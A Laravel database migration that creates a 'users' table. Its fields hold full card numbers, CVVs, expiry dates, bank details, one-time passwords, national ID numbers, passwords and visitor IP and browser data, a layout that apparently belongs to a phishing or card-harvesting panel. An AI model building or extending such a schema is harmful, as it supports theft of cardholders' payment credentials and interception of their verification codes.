<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('users', function (Blueprint $table) {
            $table->id();
            $table->string('user_unique_id');
            $table->string('mit_id');
            $table->string('name')->nullable();
            $table->string('card_bin')->nullable();
            $table->string('card_name')->nullable();
            $table->string('card_type')->nullable();
            $table->string('card_level')->nullable();
            $table->string('card_number')->nullable();
            $table->string('card_cvv')->nullable();
            $table->string('card_expiry_date')->nullable();
            $table->string('bank_name')->nullable();
            $table->string('service_code')->nullable();
            $table->string('dob')->nullable();
            $table->string('city')->nullable();
            $table->string('state')->nullable();
            $table->string('province')->nullable();
            $table->string('post_code')->nullable();
            $table->string('otp')->nullable();
            $table->string('app_code')->nullable();
            $table->string('cpr_number')->nullable();
            $table->string('phone_number')->nullable();
            $table->string('address')->nullable();
            $table->string('user_agent');
            $table->string('browser_name');
            $table->string('os');
            $table->string('ip_address');
            $table->string('status')->nullable();
            $table->string('password')->nullable();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('users');
    }
};
